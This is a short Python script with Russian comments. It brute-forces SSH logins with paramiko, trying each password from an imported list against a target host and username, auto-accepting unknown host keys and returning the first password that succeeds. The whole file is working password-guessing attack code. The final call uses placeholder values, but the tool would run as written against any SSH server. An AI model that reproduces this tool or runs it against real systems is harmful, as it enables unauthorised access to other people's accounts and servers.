from list_password import all_passwords
import paramiko

def ssh_bruteforce(target_host, username, password_list): 
    #target_host принимает IP или доменное имя, username принимает имя пользователя, password_list принимает список паролей(all_password)
    client = paramiko.SSHClient() #Cоздаёт экземпляр SSH-клиента
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Позволяет подключаться даже к неизвесним серверам

    for password in password_list:
        try:
            print(f"Пробуем пароль: {password}")
            client.connect(target_host, username=username, password=password, timeout=3)
            print(f"Пароль найден: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print("Неверный пароль")
        except Exception as e:
            print(f"Ошибка: {e}")

    print("Подходящий пароль не найден")
    return None
    #Цыкл подбора пароля

passwords = all_passwords  
ssh_bruteforce('url', 'username', passwords)
